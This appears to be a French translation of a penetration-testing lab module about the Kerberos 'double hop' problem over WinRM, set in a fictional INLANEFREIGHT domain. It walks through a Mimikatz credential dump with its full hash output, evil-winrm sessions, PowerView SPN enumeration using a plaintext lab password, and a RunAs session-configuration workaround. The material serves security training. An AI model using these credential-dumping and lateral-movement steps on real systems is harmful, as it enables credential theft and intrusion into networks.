Problème de "double saut" Kerberos
==================================

* * * * *

Il existe un problème connu sous le nom de « double saut » qui survient lorsqu'un attaquant tente d'utiliser l'authentification Kerberos sur deux (ou plusieurs) sauts. Le problème concerne la manière dont les tickets Kerberos sont accordés pour des ressources spécifiques. Les tickets Kerberos ne doivent pas être considérés comme des mots de passe. Il s'agit de données signées du KDC qui indiquent les ressources auxquelles un compte peut accéder. Lorsque nous effectuons l'authentification Kerberos, nous obtenons un « ticket » qui nous permet d'accéder à la ressource demandée (c'est-à-dire une seule machine). Au contraire, lorsque nous utilisons un mot de passe pour nous authentifier, ce hachage NTLM est stocké dans notre session et peut être utilisé ailleurs sans problème.

* * * * *

Arrière-plan
------------

Le problème du « Double Hop » se produit souvent lors de l'utilisation de WinRM/Powershell puisque le mécanisme d'authentification par défaut ne fournit qu'un ticket pour accéder à une ressource spécifique. Cela entraînera probablement des problèmes lorsque vous tenterez d'effectuer un mouvement latéral ou même d'accéder à des partages de fichiers à partir du shell distant. Dans cette situation, le compte utilisateur utilisé a le droit d'effectuer une action mais se voit refuser l'accès. Le moyen le plus courant d'obtenir des shells consiste à attaquer une application sur l'hôte cible ou à utiliser des informations d'identification et un outil tel que PSExec. Dans ces deux scénarios, l'authentification initiale a probablement été effectuée via SMB ou LDAP, ce qui signifie que le hachage NTLM de l'utilisateur serait stocké en mémoire. Parfois, nous disposons d'un ensemble d'informations d'identification et sommes limités à une méthode d'authentification particulière, telle que WinRM, ou préférons utiliser WinRM pour un certain nombre de raisons.

Le nœud du problème est que lors de l'utilisation de WinRM pour s'authentifier sur deux connexions ou plus, le mot de passe de l'utilisateur n'est jamais mis en cache dans le cadre de sa connexion. Si nous utilisons Mimikatz pour examiner la session, nous verrons que toutes les informations d'identification sont vides. Comme indiqué précédemment, lorsque nous utilisons Kerberos pour établir une session à distance, nous n'utilisons pas de mot de passe pour l'authentification. Lorsque l'authentification par mot de passe est utilisée, avec PSExec, par exemple, ce hachage NTLM est stocké dans la session, donc lorsque nous accédons à une autre ressource, la machine peut extraire le hachage de la mémoire et nous authentifier.

Jetons un coup d'oeil rapide. Si nous nous authentifions auprès de l'hôte distant via WinRM, puis exécutons Mimikatz, nous ne voyons pas les informations d'identification de l' `backupadm`utilisateur en mémoire.

  Problème de "double saut" Kerberos

```
PS C:\htb> PS C:\Users\ben.INLANEFREIGHT> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
[DEV01]: PS C:\Users\backupadm\Documents> cd 'C:\Users\Public\'
[DEV01]: PS C:\Users\Public> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 45177 (00000000:0000b079)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
        ssp :
        credman :

Authentication Id : 0 ; 1284107 (00000000:0013980b)
Session           : Interactive from 1
User Name         : srvadmin
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 6/28/2022 3:46:05 PM
SID               : S-1-5-21-1666128402-2659679066-1433032234-1107
        msv :
         [00000003] Primary
         * Username : srvadmin
         * Domain   : INLANEFREIGHT
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
         * DPAPI    : 64fa83034ef8a3a9b52c1861ac390bce
        tspkg :
        wdigest :
         * Username : srvadmin
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : srvadmin
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 70669 (00000000:0001140d)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:33 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
        ssp :
        credman :

Authentication Id : 0 ; 45178 (00000000:0000b07a)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
        ssp :
        credman :

Authentication Id : 0 ; 44190 (00000000:0000ac9e)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               :
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DEV01$
Domain            : INLANEFREIGHT
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1284140 (00000000:0013982c)
Session           : Interactive from 1
User Name         : srvadmin
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 6/28/2022 3:46:05 PM
SID               : S-1-5-21-1666128402-2659679066-1433032234-1107
        msv :
         [00000003] Primary
         * Username : srvadmin
         * Domain   : INLANEFREIGHT
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
         * DPAPI    : 64fa83034ef8a3a9b52c1861ac390bce
        tspkg :
        wdigest :
         * Username : srvadmin
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : srvadmin
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 70647 (00000000:000113f7)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:33 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
        ssp :

Authentication Id : 0 ; 996 (00000000:000003e4)
User Name         : DEV01$
Domain            : INLANEFREIGHT
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:33 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # exit
Bye!

```

Il existe en effet des processus exécutés dans le contexte de l' `backupadm`utilisateur, tels que `wsmprovhost.exe`, qui est le processus qui apparaît lorsqu'une session Windows Remote PowerShell est générée.

  Problème de "double saut" Kerberos

```
[DEV01]: PS C:\Users\Public> tasklist /V |findstr backupadm
wsmprovhost.exe               1844 Services                   0     85,212 K Unknown         INLANEFREIGHT\backupadm
                             0:00:03 N/A
tasklist.exe                  6532 Services                   0      7,988 K Unknown         INLANEFREIGHT\backupadm
                             0:00:00 N/A
conhost.exe                   7048 Services                   0     12,656 K Unknown         INLANEFREIGHT\backupadm
                             0:00:00 N/A

```

En termes simples, dans cette situation, lorsque nous essayons d'émettre une commande multi-serveur, nos informations d'identification ne seront pas envoyées de la première machine à la seconde.

Disons que nous avons trois hôtes : `Attack host`--> `DEV01`--> `DC01`. Notre hôte d'attaque est un boîtier Parrot au sein du réseau d'entreprise mais non joint au domaine. Nous obtenons un ensemble d'informations d'identification pour un utilisateur de domaine et constatons qu'il fait partie du `Remote Management Users`groupe sur DEV01. Nous souhaitons utiliser `PowerView`pour énumérer le domaine, ce qui nécessite une communication avec le contrôleur de domaine, DC01.

![image](https://academy.hackthebox.com/storage/modules/143/double_hop.png)

Lorsque nous nous connectons à `DEV01`l'aide d'un outil tel que `evil-winrm`, nous nous connectons avec l'authentification réseau, de sorte que nos informations d'identification ne sont pas stockées en mémoire et, par conséquent, ne seront pas présentes sur le système pour s'authentifier auprès d'autres ressources au nom de notre utilisateur. Lorsque nous chargeons un outil tel que `PowerView`et tentons d'interroger Active Directory, Kerberos n'a aucun moyen d'indiquer au contrôleur de domaine que notre utilisateur peut accéder aux ressources du domaine. Cela se produit car le ticket Kerberos TGT (Ticket Granting Ticket) de l'utilisateur n'est pas envoyé à la session distante ; par conséquent, l'utilisateur n'a aucun moyen de prouver son identité et les commandes ne seront plus exécutées dans le contexte de cet utilisateur. En d'autres termes, lors de l'authentification auprès de l'hôte cible, le ticket TGS (ticket-granting service) de l'utilisateur est envoyé au service distant, ce qui permet l'exécution de la commande, mais le ticket TGT de l'utilisateur n'est pas envoyé. Lorsque l'utilisateur tente d'accéder aux ressources suivantes du domaine, son TGT ne sera pas présent dans la requête, le service distant n'aura donc aucun moyen de prouver que la tentative d'authentification est valide et l'accès au service distant nous sera refusé.

Si la délégation sans contrainte est activée sur un serveur, il est probable que nous ne serons pas confrontés au problème du « Double Hop ». Dans ce scénario, lorsqu'un utilisateur envoie son ticket TGS pour accéder au serveur cible, son ticket TGT sera envoyé avec la demande. Le serveur cible a désormais le ticket TGT de l'utilisateur en mémoire et peut l'utiliser pour demander un ticket TGS en son nom sur le prochain hôte auquel il tente d'accéder. En d'autres termes, le ticket TGS du compte est mis en cache, ce qui permet de signer des TGT et d'accorder un accès à distance. De manière générale, si vous atterrissez sur une case avec délégation sans contrainte, vous avez déjà gagné et de toute façon, vous ne vous en souciez pas.

* * * * *

Solutions de contournement
--------------------------

Quelques solutions de contournement au problème du double saut sont abordées dans [cet article](https://posts.slayerlabs.com/double-hop/) . Nous pouvons utiliser un "imbriqué" `Invoke-Command`pour envoyer des informations d'identification (après avoir créé un objet PSCredential) avec chaque requête, donc si nous essayons de nous authentifier depuis notre hôte d'attaque vers l'hôte A et d'exécuter des commandes sur l'hôte B, nous sommes autorisés. Nous aborderons deux méthodes dans cette section : la première étant celle que nous pouvons utiliser si nous travaillons avec une `evil-winrm`session et la seconde si nous avons un accès GUI à un hôte Windows (soit un hôte d'attaque dans le réseau, soit un hôte rejoint par un domaine). hôte que nous avons compromis.)

* * * * *

Solution de contournement n° 1 : objet PSCredential
---------------------------------------------------

Nous pouvons également nous connecter à l'hôte distant via l'hôte A et configurer un objet PSCredential pour transmettre à nouveau nos informations d'identification. Voyons cela en action.

Après nous être connectés à un hôte distant avec les informations d'identification du domaine, nous importons PowerView puis essayons d'exécuter une commande. Comme vu ci-dessous, nous obtenons une erreur car nous ne pouvons pas transmettre notre authentification au contrôleur de domaine pour interroger les comptes SPN.

  Problème de "double saut" Kerberos

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn
Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DirectoryServicesCOMException

```

Si nous vérifions avec `klist`, nous constatons que nous n'avons qu'un ticket Kerberos en cache pour notre serveur actuel.

  Problème de "double saut" Kerberos

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x57f8a

Cached Tickets: (1)

#0> Client: backupadm @ INLANEFREIGHT.LOCAL
    Server: academy-aen-ms0$ @
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0xa10000 -> renewable pre_authent name_canonicalize
    Start Time: 6/28/2022 7:31:53 (local)
    End Time:   6/28/2022 7:46:53 (local)
    Renew Time: 7/5/2022 7:31:18 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0x4 -> S4U
    Kdc Called: DC01.INLANEFREIGHT.LOCAL

```

Alors maintenant, configurons un objet PSCredential et réessayons. Tout d'abord, nous configurons notre authentification.

  Problème de "double saut" Kerberos

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents>  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)

```

Nous pouvons maintenant essayer d'interroger les comptes SPN à l'aide de PowerView et réussir car nous avons transmis nos informations d'identification avec la commande.

  Problème de "double saut" Kerberos

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc

```

Si nous réessayons sans spécifier le `-credential`drapeau, nous obtenons à nouveau un message d'erreur.

  Problème de "double saut" Kerberos

```
get-domainuser -spn | select

*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DirectoryServicesCOMException

```

Si nous RDP vers le même hôte, ouvrons une invite CMD et tapons `klist`, nous verrons que nous avons les tickets nécessaires en cache pour interagir directement avec le contrôleur de domaine, et nous n'avons pas à nous soucier du problème du double saut. En effet, notre mot de passe est stocké en mémoire et peut donc être envoyé avec chaque demande que nous faisons.

  Problème de "double saut" Kerberos

```
C:\htb> klist

Current LogonId is 0:0x1e5b8b

Cached Tickets: (4)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x2 -> DELEGATION
        Kdc Called: DC01.INLANEFREIGHT.LOCAL

#1>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC01.INLANEFREIGHT.LOCAL

#2>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: ProtectedStorage/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC01.INLANEFREIGHT.LOCAL

#3>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: cifs/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC01.INLANEFREIGHT.LOCAL

```

* * * * *

Solution de contournement n°2 : enregistrer la configuration de la session PS
-----------------------------------------------------------------------------

Nous avons vu ce que nous pouvons faire pour surmonter ce problème lors de l'utilisation d'un outil tel que `evil-winrm`la connexion à un hôte via WinRM. Que se passe-t-il si nous sommes sur un hôte appartenant à un domaine et pouvons nous connecter à distance à un autre à l'aide de WinRM ? Ou nous travaillons à partir d'un hôte d'attaque Windows et nous nous connectons à notre cible via WinRM à l'aide de l' [applet de commande Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2) ? Ici, nous avons une autre option pour modifier notre configuration afin de pouvoir interagir directement avec le contrôleur de domaine ou d'autres hôtes/ressources sans avoir à configurer un objet PSCredential et inclure des informations d'identification avec chaque commande (ce qui peut ne pas être une option avec certains outils).

Commençons par établir une session WinRM sur l'hôte distant.

  Problème de "double saut" Kerberos

```
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm

```

Si nous vérifions les tickets mis en cache à l'aide de `klist`, nous verrons que le même problème existe. En raison du problème de double saut, nous ne pouvons interagir qu'avec les ressources de notre session en cours, mais nous ne pouvons pas accéder directement au contrôleur de domaine à l'aide de PowerView. Nous pouvons voir que notre TGS actuel est bon pour accéder au service HTTP sur la cible puisque nous nous sommes connectés via WinRM, qui utilise des requêtes SOAP (Simple Object Access Protocol) au format XML pour communiquer via HTTP, c'est donc logique.

  Problème de "double saut" Kerberos

```
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x11e387

Cached Tickets: (1)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
       Server: HTTP/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
       Start Time: 6/28/2022 9:09:19 (local)
       End Time:   6/28/2022 19:09:19 (local)
       Renew Time: 0
       Session Key Type: AES-256-CTS-HMAC-SHA1-96
       Cache Flags: 0x8 -> ASC
       Kdc Called:

```

Nous ne pouvons pas non plus interagir directement avec le DC à l'aide de PowerView

  Problème de "double saut" Kerberos

```
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> Import-Module .\PowerView.ps1
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname

Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
   + FullyQualifiedErrorId : DirectoryServicesCOMException

```

Une astuce que nous pouvons utiliser ici consiste à enregistrer une nouvelle configuration de session à l'aide de la cmdlet [Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2) .

  Problème de "double saut" Kerberos

```
PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

 WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce
 a security boundary between different user sessions that are created by using this endpoint. Verify that the Windows
PowerShell runspace configuration is restricted to only the necessary set of cmdlets and capabilities.
WARNING: Register-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has
recently been unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be
 required.
All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session
configurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected.

   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin

Type            Keys                                Name
----            ----                                ----
Container       {Name=backupadmsess}                backupadmsess

```

Une fois cela fait, nous devons redémarrer le service WinRM en tapant `Restart-Service WinRM`notre PSSession actuelle. Cela nous expulsera, nous allons donc démarrer une nouvelle session PSSession en utilisant la session enregistrée nommée que nous avons configurée précédemment.

Après avoir démarré la session, nous pouvons voir que le problème du double saut a été éliminé, et si nous tapons `klist`, nous aurons les tickets en cache nécessaires pour atteindre le contrôleur de domaine. Cela fonctionne car notre machine locale usurpera désormais l'identité de la machine distante dans le contexte de l' `backupadm`utilisateur et toutes les demandes de notre machine locale seront envoyées directement au contrôleur de domaine.

  Problème de "double saut" Kerberos

```
PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
[DEV01]: PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x2239ba

Cached Tickets: (1)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
       Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
       Start Time: 6/28/2022 13:24:37 (local)
       End Time:   6/28/2022 23:24:37 (local)
       Renew Time: 7/5/2022 13:24:37 (local)
